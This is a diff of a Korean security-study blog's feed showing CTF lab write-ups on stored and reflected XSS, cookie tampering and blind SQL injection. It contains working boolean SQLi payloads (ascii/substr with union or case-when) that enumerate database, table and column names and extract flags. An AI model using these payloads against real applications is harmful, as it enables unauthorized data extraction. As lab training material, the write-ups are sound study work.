 
 <hr />
 
 <p><br /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection5/2.PNG" alt="2" /></p>
+<p>데이터가 저장되고, 그 데이터가 출력 되는 곳에서 실행할 수 있습니다. <br />
+예를 들어 회원 가입, 게시판 글 작성 등 과 같은 곳입니다.</p>
 
-<p><img src="/images/2024-05-29-SQLinjection5/3.PNG" alt="3" style="zoom:67%;" /></p>
+<p>작성 글에  악성 스크립트를 넣어 저장하고 해당 글을 보는 클라이언트를 대상으로 공격합니다.</p>
 
-<p>직접 해보니 doldol로 로그인이 가능하다는 사실을 알 수 있었고, burp suite 으로 확인한 결과 로그인 할 때 POST 방식으로 데이터를 <br />
-서버로 전송하고 있네요.</p>
+<p><br /></p>
 
-<h3 id="112-서버로-보내는-데이터-확인하기"><br /><span style="background:#A9A9A9; color:#ffffff">1.1.2  서버로 보내는 데이터 확인하기</span></h3>
+<p>절차에 대해서 살펴보면</p>
+
+<ol>
+  <li>
+    <p>작성한 데이터가 화면에 응답되는 지 확인! (저장된 데이터가 제대로 출력 되는 지 확인)</p>
+  </li>
+  <li>
+    <p>특수문자 체크 (어떤 특수 문자를 사용가능한가 확인)</p>
+  </li>
+  <li>
+    <p>javascript이용</p>
+  </li>
+</ol>
+
+<p><br /></p>
+
+<p><img src="/images/2024-06-16-XSS1/image-20240617183951416.png" alt="image-20240617183951416" style="zoom:67%;" /></p>
+
+<p><img src="/images/2024-06-16-XSS1/image-20240617183813882.png" alt="image-20240617183813882" style="zoom: 67%;" /></p>
+
+<p>burp suite을 통해 저장된 데이터가 페이지에 제대로 출력되는 지 확인 하였다. <br />
+그리고 &lt;,’,”,&gt; 와 같은 특수문자를 사용할 수 있는 지 확인 하였다.</p>
+
+<p><br /></p>
+
+<p><img src="/images/2024-06-16-XSS1/image-20240617184034885.png" alt="image-20240617184034885" style="zoom:67%;" /></p>
+
+<p><img src="/images/2024-06-16-XSS1/image-20240617184136042.png" alt="image-20240617184136042" style="zoom:67%;" /></p>
+
+<p>script태그에 alert(1)를 작성하여 데이터를 저장하였다. 이는 페이지를 들어오게 되면 1이라는 경고창이 발생하는 스크립트이다.</p>
+
+<p><img src="/images/2024-06-16-XSS1/캡처_2024_06_17_18_43_08_60.png" alt="캡처_2024_06_17_18_43_08_60" style="zoom:67%;" /></p>
+
+<p>이제 위의 xss-store url에 들어가면 1이라는 경고창이 뜬다. <br />
+따라서 공격자가 스크립트를 삽입하게 되면, 해당 url에 들어오는 다수의 클라이언트에게 영향을 끼치게 된다.</p>
+
+<p>참고로, 방금 전에는 데이터를 삽입시에 같은 페이지에서 출력되었지만 출력 화면이 다른 페이지에서도 일어날 수 있다.</p>
+
+<p><br /></p>
+
+<h4 id="112-reflected-xss"><span style="background:#A9A9A9; color:#ffffff">1.1.2 Reflected XSS</span></h4>
 
 <hr />
 
 <p><br /></p>
 
-<p><span style="font-weight:bold; font-size:20px"><login.php>&lt;/span&gt;</login.php></span></p>
+<p>해당 방법은 서버의 에코 기능을 이용하는 것 입니다.</p>
 
-<p><img src="/images/2024-05-29-SQLinjection5/4-1716914699805-15.PNG" alt="4" style="zoom: 60%;" /></p>
+<p>Stored XSS 와 방법 절차는 같습니다.</p>
 
-<p>doldol로 로그인 할 때 쿠키 형식으로 보내서 set-cookie 가 나타났습니다.</p>
+<p>하지만  이 방법은 페이지에 직접 악성 코드를 작성하는게 아니라 파라미터에 변화에 따른 공격이기 때문에 <br />
+악성 스크립트를 작성하여 링크를 전달하여 공격합니다.</p>
+
+<p>또한, 페이로드가 GET메서드를 이용하여 파라미터가 서버 응답에 그대로 찍혀나오는 지 <br />
+확인하기 때문에, 데이터 저장하는 페이지와 출력되는 페이지가 같습니다.</p>
+
+<p>Stored XSS 는 다수의 클라이언트에게 영향을 끼칠 수 있지만 <br />
+이는 직접 링크를 받아 클릭한 소수의 클라이언트에게 영향을 끼치는 공격방법입니다.</p>
+
+<p><img src="/images/2024-06-16-XSS1/image-20240617184501016.png" alt="image-20240617184501016" style="zoom:67%;" /></p>
+
+<p><img src="/images/2024-06-16-XSS1/image-20240617184712254.png" alt="image-20240617184712254" style="zoom:67%;" /></p>
+
+<p>파라미터가 페이지에 그대로 출력이 되어, Reflected XSS가 가능하다, 또한 특수문자도 모두 허용된다.</p>
 
 <p><br /></p>
 
-<p><span style="font-weight:bold; font-size:20px"><index.php>&lt;/span&gt;</index.php></span></p>
+<p><img src="/images/2024-06-16-XSS1/image-20240617184840206.png" alt="image-20240617184840206" style="zoom:67%;" /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection5/5-1716914786884-17.PNG" alt="5" style="zoom: 60%;" /></p>
+<p><img src="/images/2024-06-16-XSS1/image-20240617184859375.png" alt="image-20240617184859375" style="zoom:67%;" /></p>
 
-<p>그래서 로그인 된 화면은 쿠키가 있는 것으로 확인 되네요. 쿠키는 로그인이 될 수 있게 도움을 줍니다<br />
-하지만 클라이언트 측에서 정보를 조작할 수 있다는 치명적인 단점이 있습니다. <br />
-이것을 이용해서 저희가 접속해야 할 admin 계정으로 조작해봅시다.</p>
+<p><img src="/images/2024-06-16-XSS1/캡처_2024_06_17_18_49_33_548.png" alt="캡처_2024_06_17_18_49_33_548" style="zoom:67%;" /></p>
 
-<h3 id="113-cookie-정보-조작하기"><br /><span style="background:#A9A9A9; color:#ffffff">1.1.3  Cookie 정보 조작하기</span></h3>
+<p>해당 url에 들어가면 1이라는 경고문이 뜬다.</p>]]></content><author><name>ethan</name></author><category term="XSS" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">8 주차 SQL injection 데이터 추출 문제 풀이(4)</title><link href="http://localhost:4000/sql-injection/SQLinjection28/" rel="alternate" type="text/html" title="8 주차 SQL injection 데이터 추출 문제 풀이(4)" /><published>2024-06-09T00:00:00+09:00</published><updated>2024-06-09T00:00:00+09:00</updated><id>http://localhost:4000/sql-injection/SQLinjection28</id><content type="html" xml:base="http://localhost:4000/sql-injection/SQLinjection28/"><![CDATA[<p><br /></p>
 
-<hr />
-
-<p><br /></p>
-
-<p><img src="/images/2024-05-29-SQLinjection5/6-1716914942595-19.PNG" alt="6" style="zoom:60%;" /></p>
-
-<p>cookie의 doldol를 admin으로 조작하고, 서버의 반응 값을 보니 flag가 나타나네요.</p>]]></content><author><name>ethan</name></author><category term="SQL-injection" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">5주차 SQL injection 인증우회 문제풀이(10)</title><link href="http://localhost:4000/sql-injection/SQLinjection14/" rel="alternate" type="text/html" title="5주차 SQL injection 인증우회 문제풀이(10)" /><published>2024-05-29T00:00:00+09:00</published><updated>2024-05-29T00:00:00+09:00</updated><id>http://localhost:4000/sql-injection/SQLinjection14</id><content type="html" xml:base="http://localhost:4000/sql-injection/SQLinjection14/"><![CDATA[<p><br /></p>
-
-<h1 id="1-5주차-sql-injection-인증우회-문제풀이10"><span style="background:#000000; color:#ffffff">1. 5주차 SQL injection 인증우회 문제풀이(10)</span></h1>
+<h1 id="1-8-주차-sql-injection-데이터-추출-문제-풀이4"><span style="background:#000000; color:#ffffff">1. 8 주차 SQL injection 데이터 추출 문제 풀이(4)</span></h1>
 
 <p><br /><span style="font-weight:bold; font-size:15px"> ※ 주의 사항 :</span></p>
 
@@ -979,37 +303,119 @@ doldol’ and ‘1’=’1 시도 해본 결과, 302 Found로 리다이렉션이
 
 <p><br /></p>
 
-<h2 id="11-10번-문제"><span style="background:#696969; color:#ffffff">1.1  10번 문제</span></h2>
+<h2 id="11-sqli-point-4-문제"><span style="background:#696969; color:#ffffff">1.1  SQLi Point 4 문제 </span></h2>
 
-<p><br /><img src="/images/2024-05-29-SQLinjection14/1.PNG" alt="1" /></p>
+<p><br /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection14/2.PNG" alt="2" /></p>
+<p><img src="/images/2024-06-09-SQLinjection28/image-20240612231453430.png" alt="image-20240612231453430" style="zoom:67%;" /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection14/3.PNG" alt="3" /></p>
+<p><br /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection14/4.PNG" alt="4" /></p>
+<h4 id="111-sql-injection-포인트-찾기"><span style="background:#A9A9A9; color:#ffffff">1.1.1 sql injection 포인트 찾기</span></h4>
 
-<p><img src="/images/2024-05-29-SQLinjection14/5.PNG" alt="5" /></p>
+<hr />
 
-<p><img src="/images/2024-05-29-SQLinjection14/6.PNG" alt="6" /></p>
+<p><br /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection14/8.PNG" alt="8" /><img src="/images/2024-05-29-SQLinjection14/7.PNG" alt="7" /></p>
+<p><img src="/images/2024-06-09-SQLinjection28/image-20240612231942789.png" alt="image-20240612231942789" style="zoom:67%;" /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection14/9.PNG" alt="9" /></p>
+<p><img src="/images/2024-06-09-SQLinjection28/image-20240612232040980.png" alt="image-20240612232040980" /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection14/10.PNG" alt="10" /></p>
+<p><img src="/images/2024-06-09-SQLinjection28/image-20240612232100428.png" alt="image-20240612232100428" /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection14/11.PNG" alt="11" /></p>
+<p><img src="/images/2024-06-09-SQLinjection28/image-20240612232120621.png" alt="image-20240612232120621" /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection14/12.PNG" alt="12" /></p>
+<p><img src="/images/2024-06-09-SQLinjection28/image-20240612232441799.png" alt="image-20240612232441799" /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection14/13.PNG" alt="13" /></p>
+<p><img src="/images/2024-06-09-SQLinjection28/image-20240612232515765.png" alt="image-20240612232515765" /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection14/14.PNG" alt="14" /></p>
+<p><br /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection14/15.PNG" alt="15" /></p>]]></content><author><name>ethan</name></author><category term="SQL-injection" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">5주차 SQL injection 인증우회 문제풀이(9)</title><link href="http://localhost:4000/sql-injection/SQLinjection13/" rel="alternate" type="text/html" title="5주차 SQL injection 인증우회 문제풀이(9)" /><published>2024-05-29T00:00:00+09:00</published><updated>2024-05-29T00:00:00+09:00</updated><id>http://localhost:4000/sql-injection/SQLinjection13</id><content type="html" xml:base="http://localhost:4000/sql-injection/SQLinjection13/"><![CDATA[<p><br /></p>
+<h4 id="112--select-문구가-사용가능한-지-체크"><span style="background:#A9A9A9; color:#ffffff">1.1.2  select 문구가 사용가능한 지 체크</span></h4>
 
-<h1 id="1-5주차-sql-injection-인증우회-문제풀이9"><span style="background:#000000; color:#ffffff">1. 5주차 SQL injection 인증우회 문제풀이(9)</span></h1>
+<hr />
+
+<p><br /></p>
+
+<p><img src="/images/2024-06-09-SQLinjection28/image-20240612232820682.png" alt="image-20240612232820682" style="zoom:67%;" /></p>
+
+<p><img src="/images/2024-06-09-SQLinjection28/image-20240612232803575.png" alt="image-20240612232803575" /></p>
+
+<p><br /></p>
+
+<h4 id="113-공격-format-만들기"><span style="background:#A9A9A9; color:#ffffff">1.1.3 공격 format 만들기</span></h4>
+
+<hr />
+
+<p><br /></p>
+
+<p>1234’ and (select 1 union select 2 where (ascii(substr((select ~~),1,1))&gt;0)) and ‘1’=’1</p>
+
+<p><br /></p>
+
+<h4 id="114-db이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.4 DB이름 확인하기</span></h4>
+
+<hr />
+
+<p><br /></p>
+
+<p>select database() limit 0,1</p>
+
+<p>1234’ and (select 1 union select 2 where (ascii(substr((select database() limit 0,1),1,1))&gt;0)) and ‘1’=’1</p>
+
+<p><img src="/images/2024-06-09-SQLinjection28/image-20240612233212197.png" alt="image-20240612233212197" /></p>
+
+<p>sqli_9</p>
+
+<p><br /></p>
+
+<h4 id="115-table이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.5 table이름 확인하기</span></h4>
+
+<hr />
+
+<p><br /></p>
+
+<p>select table_name from information_schema.tables where table_schema=’sqli_9’ limit 0,1</p>
+
+<p>1234’ and (select 1 union select 2 where (ascii(substr((select table_name from information_schema.tables where table_schema=’sqli_9’ limit 0,1),1,1))&gt;0)) and ‘1’=’1</p>
+
+<p><img src="/images/2024-06-09-SQLinjection28/image-20240612233431791.png" alt="image-20240612233431791" /></p>
+
+<p>flagHere</p>
+
+<p><br /></p>
+
+<h4 id="116-column-이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.6 column 이름 확인하기</span></h4>
+
+<hr />
+
+<p><br /></p>
+
+<p>select column_name from information_schema.columns where table_name=’flagHere’ limit 0,1</p>
+
+<p>1234’ and (select 1 union select 2 where (ascii(substr((select column_name from information_schema.columns where table_name=’flagHere’ limit 0,1),1,1))&gt;0)) and ‘1’=’1</p>
+
+<p><img src="/images/2024-06-09-SQLinjection28/image-20240612233608694.png" alt="image-20240612233608694" /></p>
+
+<p>flag</p>
+
+<p><br /></p>
+
+<h4 id="117-data-추출하기"><span style="background:#A9A9A9; color:#ffffff">1.1.7 data 추출하기</span></h4>
+
+<hr />
+
+<p><br /></p>
+
+<p>select flag from flagHere limit 0,1</p>
+
+<p>1234’ and (select 1 union select 2 where (ascii(substr((select flag from flagHere limit 0,1),1,1))&gt;0)) and ‘1’=’1</p>
+
+<p><img src="/images/2024-06-09-SQLinjection28/image-20240612233800643.png" alt="image-20240612233800643" /></p>
+
+<p>segfault{~~}</p>]]></content><author><name>ethan</name></author><category term="SQL-injection" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">8 주차 SQL injection 데이터 추출 문제 풀이(3)</title><link href="http://localhost:4000/sql-injection/SQLinjection27/" rel="alternate" type="text/html" title="8 주차 SQL injection 데이터 추출 문제 풀이(3)" /><published>2024-06-09T00:00:00+09:00</published><updated>2024-06-09T00:00:00+09:00</updated><id>http://localhost:4000/sql-injection/SQLinjection27</id><content type="html" xml:base="http://localhost:4000/sql-injection/SQLinjection27/"><![CDATA[<p><br /></p>
+
+<h1 id="1-8-주차-sql-injection-데이터-추출-문제-풀이3"><span style="background:#000000; color:#ffffff">1. 8 주차 SQL injection 데이터 추출 문제 풀이(3)</span></h1>
 
 <p><br /><span style="font-weight:bold; font-size:15px"> ※ 주의 사항 :</span></p>
 
@@ -1019,17 +425,117 @@ doldol’ and ‘1’=’1 시도 해본 결과, 302 Found로 리다이렉션이
 
 <p><br /></p>
 
-<h2 id="11-9번-문제"><span style="background:#696969; color:#ffffff">1.1  9번 문제</span></h2>
+<h2 id="11-sqli-point-3-문제"><span style="background:#696969; color:#ffffff">1.1  SQLi Point 3 문제 </span></h2>
 
-<p><br /><img src="/images/2024-05-29-SQLinjection13/1.PNG" alt="1" /></p>
+<p><br /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection13/2.PNG" alt="2" /></p>
+<p><img src="/images/2024-06-09-SQLinjection27/image-20240612223253299.png" alt="image-20240612223253299" style="zoom:67%;" /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection13/3.PNG" alt="3" /></p>
+<p><br /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection13/4.PNG" alt="4" /></p>]]></content><author><name>ethan</name></author><category term="SQL-injection" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">5주차 SQL injection 인증우회 문제풀이(8)</title><link href="http://localhost:4000/sql-injection/SQLinjection12/" rel="alternate" type="text/html" title="5주차 SQL injection 인증우회 문제풀이(8)" /><published>2024-05-29T00:00:00+09:00</published><updated>2024-05-29T00:00:00+09:00</updated><id>http://localhost:4000/sql-injection/SQLinjection12</id><content type="html" xml:base="http://localhost:4000/sql-injection/SQLinjection12/"><![CDATA[<p><br /></p>
+<h4 id="111-sql-injection-포인트-찾기"><span style="background:#A9A9A9; color:#ffffff">1.1.1 sql injection 포인트 찾기</span></h4>
 
-<h1 id="1-5주차-sql-injection-인증우회-문제풀이8"><span style="background:#000000; color:#ffffff">1. 5주차 SQL injection 인증우회 문제풀이(8)</span></h1>
+<hr />
+
+<p><br /></p>
+
+<p><img src="/images/2024-06-09-SQLinjection27/image-20240612223409408.png" alt="image-20240612223409408" /></p>
+
+<p><img src="/images/2024-06-09-SQLinjection27/image-20240612223453129.png" alt="image-20240612223453129" /></p>
+
+<p><img src="/images/2024-06-09-SQLinjection27/image-20240612223511724.png" alt="image-20240612223511724" /></p>
+
+<p><img src="/images/2024-06-09-SQLinjection27/image-20240612223529768.png" alt="image-20240612223529768" /></p>
+
+<p><img src="/images/2024-06-09-SQLinjection27/image-20240612224024682.png" alt="image-20240612224024682" /></p>
+
+<p><img src="/images/2024-06-09-SQLinjection27/image-20240612224042550.png" alt="image-20240612224042550" /></p>
+
+<p><br /></p>
+
+<h4 id="112--select-문구가-사용가능한-지-체크"><span style="background:#A9A9A9; color:#ffffff">1.1.2  select 문구가 사용가능한 지 체크</span></h4>
+
+<hr />
+
+<p><br /></p>
+
+<p><img src="/images/2024-06-09-SQLinjection27/image-20240612224146951.png" alt="image-20240612224146951" /></p>
+
+<p><img src="/images/2024-06-09-SQLinjection27/image-20240612224206340.png" alt="image-20240612224206340" /></p>
+
+<p><br /></p>
+
+<h4 id="113-공격-format-만들기"><span style="background:#A9A9A9; color:#ffffff">1.1.3 공격 format 만들기</span></h4>
+
+<hr />
+
+<p><br /></p>
+
+<p>case when (ascii(substr((select ~~),1,1))&gt;0) then 1 else (select 1 union select 2) end</p>
+
+<p><br /></p>
+
+<h4 id="114-db이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.4 DB이름 확인하기</span></h4>
+
+<hr />
+
+<p><br /></p>
+
+<p>case when (ascii(substr((select database() limit 0,1),1,1))&gt;0) then 1 else (select 1 union select 2) end</p>
+
+<p><img src="/images/2024-06-09-SQLinjection27/image-20240612225209697.png" alt="image-20240612225209697" /></p>
+
+<p>sqli_8</p>
+
+<p><br /></p>
+
+<h4 id="115-table이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.5 table이름 확인하기</span></h4>
+
+<hr />
+
+<p><br /></p>
+
+<p>select table_name from information_schema.tables where table_schema=’sqli_8’ limit 0,1</p>
+
+<p>case when (ascii(substr((select table_name from information_schema.tables where table_schema=’sqli_8’ limit 0,1),1,1))&gt;0) then 1 else (select 1 union select 2) end</p>
+
+<p><img src="/images/2024-06-09-SQLinjection27/image-20240612225349319.png" alt="image-20240612225349319" /></p>
+
+<p>flag_Table</p>
+
+<p><br /></p>
+
+<h4 id="116-column-이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.6 column 이름 확인하기</span></h4>
+
+<hr />
+
+<p><br /></p>
+
+<p>select column_name from information_schema.columns where table_name=’flag_Table’ limit 0,1</p>
+
+<p>case when (ascii(substr((select column_name from information_schema.columns where table_name=’flag_Table’ limit 0,1),1,1))&gt;0) then 1 else (select 1 union select 2) end</p>
+
+<p><img src="/images/2024-06-09-SQLinjection27/image-20240612225624384.png" alt="image-20240612225624384" /></p>
+
+<p>flagData</p>
+
+<p><br /></p>
+
+<h4 id="117-data-추출하기"><span style="background:#A9A9A9; color:#ffffff">1.1.7 data 추출하기</span></h4>
+
+<hr />
+
+<p><br /></p>
+
+<p>select flagData from flag_Table limit 0,1</p>
+
+<p>case when (ascii(substr((select flagData from flag_Table limit 0,1 ),1,1))&gt;0) then 1 else (select 1 union select 2) end</p>
+
+<p><img src="/images/2024-06-09-SQLinjection27/image-20240612230009887.png" alt="image-20240612230009887" /></p>
+
+<p>segfault{~~}</p>]]></content><author><name>ethan</name></author><category term="SQL-injection" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">8 주차 SQL injection 데이터 추출 문제 풀이(2)</title><link href="http://localhost:4000/sql-injection/SQLinjection26/" rel="alternate" type="text/html" title="8 주차 SQL injection 데이터 추출 문제 풀이(2)" /><published>2024-06-09T00:00:00+09:00</published><updated>2024-06-09T00:00:00+09:00</updated><id>http://localhost:4000/sql-injection/SQLinjection26</id><content type="html" xml:base="http://localhost:4000/sql-injection/SQLinjection26/"><![CDATA[<p><br /></p>
+
+<h1 id="1-8-주차-sql-injection-데이터-추출-문제-풀이2"><span style="background:#000000; color:#ffffff">1. 8 주차 SQL injection 데이터 추출 문제 풀이(2)</span></h1>
 
 <p><br /><span style="font-weight:bold; font-size:15px"> ※ 주의 사항 :</span></p>
 
@@ -1039,16 +545,116 @@ doldol’ and ‘1’=’1 시도 해본 결과, 302 Found로 리다이렉션이
 
 <p><br /></p>
 
-<h2 id="11-8번-문제"><span style="background:#696969; color:#ffffff">1.1  8번 문제</span></h2>
+<h2 id="11-sqli-point-2-문제"><span style="background:#696969; color:#ffffff">1.1  SQLi Point 2 문제 </span></h2>
 
 <p><br /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection12/1.PNG" alt="1" /></p>
+<p><img src="/images/2024-06-09-SQLinjection26/image-20240612204234463.png" alt="image-20240612204234463" style="zoom:67%;" /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection12/2.PNG" alt="2" /></p>
+<p><br /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection12/3.PNG" alt="3" /></p>
+<h4 id="111-sql-injection-포인트-찾기"><span style="background:#A9A9A9; color:#ffffff">1.1.1 sql injection 포인트 찾기</span></h4>
 
-<p><img src="/images/2024-05-29-SQLinjection12/4.PNG" alt="4" /></p>
+<hr />
 
-<p><img src="/images/2024-05-29-SQLinjection12/5.PNG" alt="5" /></p>]]></content><author><name>ethan</name></author><category term="SQL-injection" /><summary type="html"><![CDATA[]]></summary></entry></feed>
+<p><br /></p>
+
+<p>마이페이지와 게시판이 존재합니다.</p>
+
+<p><img src="/images/2024-06-09-SQLinjection26/image-20240612204423453.png" alt="image-20240612204423453" style="zoom: 67%;" /></p>
+
+<p><img src="/images/2024-06-09-SQLinjection26/image-20240612204359138.png" alt="image-20240612204359138" style="zoom:67%;" /></p>
+
+<p><img src="/images/2024-06-09-SQLinjection26/image-20240612204614693.png" alt="image-20240612204614693" /></p>
+
+<p><img src="/images/2024-06-09-SQLinjection26/image-20240612205028717.png" alt="image-20240612205028717" /></p>
+
+<p><img src="/images/2024-06-09-SQLinjection26/image-20240612205055104.png" alt="image-20240612205055104" /></p>
+
+<p><br /></p>
+
+<h4 id="112--select-문구가-사용가능한-지-체크"><span style="background:#A9A9A9; color:#ffffff">1.1.2  select 문구가 사용가능한 지 체크</span></h4>
+
+<hr />
+
+<p><br /></p>
+
+<p><img src="/images/2024-06-09-SQLinjection26/image-20240612205154382.png" alt="image-20240612205154382" style="zoom:67%;" /></p>
+
+<p><img src="/images/2024-06-09-SQLinjection26/image-20240612205214639.png" alt="image-20240612205214639" /></p>
+
+<p><br /></p>
+
+<h4 id="113-공격-format-만들기"><span style="background:#A9A9A9; color:#ffffff">1.1.3 공격 format 만들기</span></h4>
+
+<hr />
+
+<p><br /></p>
+
+<p>(ascii(substr((select ~~),1,1))&gt;0) and username</p>
+
+<p><br /></p>
+
+<h4 id="114-db이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.4 DB이름 확인하기</span></h4>
+
+<hr />
+
+<p><br /></p>
+
+<p>(ascii(substr((select database() limit 0,1),1,1))&gt;0) and username</p>
+
+<p><img src="/images/2024-06-09-SQLinjection26/image-20240612205441694.png" alt="image-20240612205441694" /></p>
+
+<p>sqli_7</p>
+
+<p><br /></p>
+
+<h4 id="115-table이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.5 table이름 확인하기</span></h4>
+
+<hr />
+
+<p><br /></p>
+
+<p>select table_name from information_schema.tables where table_schema=’sqli_7’ limit 0,1</p>
+
+<p>(ascii(substr((select table_name from information_schema.tables where table_schema=’sqli_7’ limit 0,1),1,1))&gt;0) and username</p>
+
+<p><img src="/images/2024-06-09-SQLinjection26/image-20240612205643107.png" alt="image-20240612205643107" /></p>
+
+<p>flagTable</p>
+
+<p><br /></p>
+
+<h4 id="116-column-이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.6 column 이름 확인하기</span></h4>
+
+<hr />
+
+<p><br /></p>
+
+<p>select column_name from information_schema.columns where table_name=’flagTable’ limit 0,1</p>
+
+<p>(ascii(substr((select column_name from information_schema.columns where table_name=’flagTable’ limit 0,1),1,1))&gt;0) and username</p>
+
+<p><img src="/images/2024-06-09-SQLinjection26/image-20240612205852379.png" alt="image-20240612205852379" /></p>
+
+<p>flag</p>
+
+<p><br /></p>
+
+<h4 id="117-data-추출하기"><span style="background:#A9A9A9; color:#ffffff">1.1.7 data 추출하기</span></h4>
+
+<hr />
+
+<p><br /></p>
+
+<p>select flag from flagTable limit 0,1</p>
+
+<p>(ascii(substr((select flag from flagTable limit 0,1),1,1)&gt;0) and username</p>
+
+<p>f~~</p>
+
+<p>w~~</p>
+
+<p><img src="/images/2024-06-09-SQLinjection26/image-20240612223150754.png" alt="image-20240612223150754" /></p>
+
+<p>segfault{~~}</p>]]></content><author><name>ethan</name></author><category term="SQL-injection" /><summary type="html"><![CDATA[]]></summary></entry></feed>
